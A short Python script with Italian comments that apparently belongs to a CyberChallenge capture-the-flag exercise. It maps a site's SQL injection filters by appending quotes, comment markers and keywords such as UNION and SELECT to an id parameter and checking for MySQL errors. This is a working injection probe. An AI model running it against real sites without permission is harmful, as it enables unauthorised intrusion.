import requests

#URL DI ATTACCO PER MAPPARE I FILTRI SUL SITO
url = "http://filtered.challs.cyberchallenge.it/post.php"

# Testiamo i sospettati principali
tests = ["'", " ", "/**/", "ORDER", "SELECT", "UNION", "--", "#", "OR"]

print(f"{'Payload':<10} | {'Fetch Error':<12} | {'Response Length'}")
print("-" * 45)

for t in tests:
    # Inviamo il test come id=4[test]
    params = {'id': f"4{t}"}
    r = requests.get(url, params=params)
    
    # Se troviamo la stringa dell'errore, l'iniezione sta "rompendo" la query (buon segno!)
    has_error = "mysqli_fetch_array" in r.text
    print(f"{t:<10} | {str(has_error):<12} | {len(r.text)}")